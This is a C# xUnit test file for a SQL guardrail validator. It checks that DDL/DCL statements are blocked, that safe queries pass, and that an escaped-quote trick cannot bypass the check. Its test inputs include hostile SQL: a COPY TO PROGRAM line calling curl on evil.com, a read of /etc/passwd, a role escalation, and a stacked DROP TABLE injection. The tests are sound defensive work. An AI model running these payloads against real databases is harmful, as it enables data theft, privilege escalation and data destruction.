namespace LocalMe.Core.Tests;

using LocalMe.Core.Database;
using Xunit;

public class SqlGuardrailValidatorTests
{
    [Theory]
    [InlineData("CREATE TABLE evil (id int);", "CREATE")]
    [InlineData("ALTER TABLE users ADD COLUMN is_admin bool;", "ALTER")]
    [InlineData("DROP TABLE orders;", "DROP")]
    [InlineData("TRUNCATE TABLE logs;", "TRUNCATE")]
    [InlineData("GRANT ALL ON users TO evil;", "GRANT")]
    [InlineData("REVOKE ALL ON users FROM normal;", "REVOKE")]
    [InlineData("VACUUM FULL;", "VACUUM")]
    [InlineData("REINDEX TABLE users;", "REINDEX")]
    [InlineData("SET session_preload_libraries = 'evil';", "SET")]
    [InlineData("SET LOCAL role = 'postgres';", "SET")]
    [InlineData("RESET ALL;", "RESET")]
    [InlineData("DO $$ BEGIN RAISE NOTICE 'evil'; END $$;", "DO")]
    [InlineData("CALL evil_procedure();", "CALL")]
    [InlineData("DISCARD ALL;", "DISCARD")]
    [InlineData("LOCK TABLE users IN ACCESS EXCLUSIVE MODE;", "LOCK")]
    public void ValidateSafeExecution_BlocksDdlAndDclTokens(string sql, string expectedBlockedToken)
    {
        var (isSafe, reason) = SqlGuardrailValidator.ValidateSafeExecution(sql);
        Assert.False(isSafe);
        Assert.NotNull(reason);
        Assert.Contains(expectedBlockedToken, reason);
    }

    [Theory]
    [InlineData("SELECT set_config('request.jwt.claim.role', 'superadmin', true);")]
    [InlineData("SELECT * FROM pg_catalog.pg_tables;")]
    [InlineData("SELECT * FROM information_schema.tables;")]
    [InlineData("SELECT pg_read_file('/etc/passwd');")]
    [InlineData("SELECT pg_terminate_backend(1234);")]
    [InlineData("COPY users TO PROGRAM 'curl evil.com';")]
    public void ValidateSafeExecution_BlocksDangerousPatterns(string sql)
    {
        var (isSafe, reason) = SqlGuardrailValidator.ValidateSafeExecution(sql);
        Assert.False(isSafe);
        Assert.NotNull(reason);
    }

    [Theory]
    [InlineData("UPDATE products SET price = 55000 WHERE id = 'p1';")]
    [InlineData("SELECT id, name, price FROM products WHERE status = 'active';")]
    [InlineData("INSERT INTO orders (id, amount) VALUES ('ord1', 1000);")]
    [InlineData("DELETE FROM temp_records WHERE expired = true;")]
    [InlineData("EXPLAIN ANALYZE SELECT * FROM orders;")]
    public void ValidateSafeExecution_AllowsValidDmlAndQueries(string sql)
    {
        var (isSafe, reason) = SqlGuardrailValidator.ValidateSafeExecution(sql);
        Assert.True(isSafe, reason);
        Assert.Null(reason);
    }

    [Fact]
    public void ValidateSafeExecution_DoesNotGetBypassedByEscapedQuotesInStringLiterals()
    {
        // Attack attempt: using escaped quote in literal string to mask a trailing DROP TABLE
        var attackSql = "SELECT * FROM notes WHERE text = 'don''t touch'; DROP TABLE sensitive_data;";
        var (isSafe, reason) = SqlGuardrailValidator.ValidateSafeExecution(attackSql);
        Assert.False(isSafe);
        Assert.Contains("DROP", reason);
    }

    [Fact]
    public void ValidateSafeExecution_AllowsSemicolonsInsideStringLiterals()
    {
        var safeSql = "SELECT * FROM notes WHERE text = 'hello; world; this is safe text';";
        var (isSafe, reason) = SqlGuardrailValidator.ValidateSafeExecution(safeSql);
        Assert.True(isSafe, reason);
    }
}
